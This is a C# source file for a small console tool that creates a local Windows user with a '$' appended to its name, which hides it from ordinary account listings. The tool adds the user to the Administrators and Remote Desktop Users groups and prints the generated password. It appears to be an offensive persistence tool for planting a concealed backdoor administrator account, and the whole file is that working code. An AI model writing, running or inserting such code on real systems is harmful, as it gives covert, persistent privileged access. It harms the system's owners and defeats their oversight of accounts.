using System;
using System.DirectoryServices;
using System.Security.Cryptography;

namespace UserAdd
{
    class Program
    {
        private const int PasswordLength = 10;
        private const string PasswordChars = "!@#$%0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("[!] By default, a 10-character random password will be generated.");
                Console.WriteLine("Usage: UserAdd.exe <username>");
                return;
            }

            string rawUser = args[0];
            string username = rawUser + "$";

            string password = GenerateRandomPassword(PasswordLength);

            try
            {
                string machinePath = $"WinNT://{Environment.MachineName},computer";
                using (DirectoryEntry computerEntry = new DirectoryEntry(machinePath))
                {
                    // Create user
                    DirectoryEntry newUser = computerEntry.Children.Add(username, "user");
                    newUser.Invoke("SetPassword", new object[] { password });
                    newUser.CommitChanges();

                    // Add user to groups
                    AddUserToLocalGroup(computerEntry, "Administrators", newUser);
                    AddUserToLocalGroup(computerEntry, "Remote Desktop Users", newUser);
                }

                Console.WriteLine("[*] Account Created Successfully");
                Console.WriteLine($"[+] Username: {username}");
                Console.WriteLine($"[+] Password: {password}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        /// <summary>
        /// Generates a cryptographically strong random password.
        /// </summary>
        private static string GenerateRandomPassword(int length)
        {
            char[] result = new char[length];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                byte[] buffer = new byte[sizeof(uint)];

                for (int i = 0; i < length; i++)
                {
                    rng.GetBytes(buffer);
                    uint value = BitConverter.ToUInt32(buffer, 0);
                    result[i] = PasswordChars[(int)(value % PasswordChars.Length)];
                }
            }

            return new string(result);
        }

        /// <summary>
        /// Adds the new user to a specified local group, if the group exists.
        /// </summary>
        private static void AddUserToLocalGroup(DirectoryEntry computerEntry, string groupName, DirectoryEntry newUser)
        {
            try
            {
                DirectoryEntry group = computerEntry.Children.Find(groupName, "group");
                group?.Invoke("Add", new object[] { newUser.Path });
            }
            catch
            {
                // Group may not exist or cannot be modified; ignore.
            }
        }
    }
}
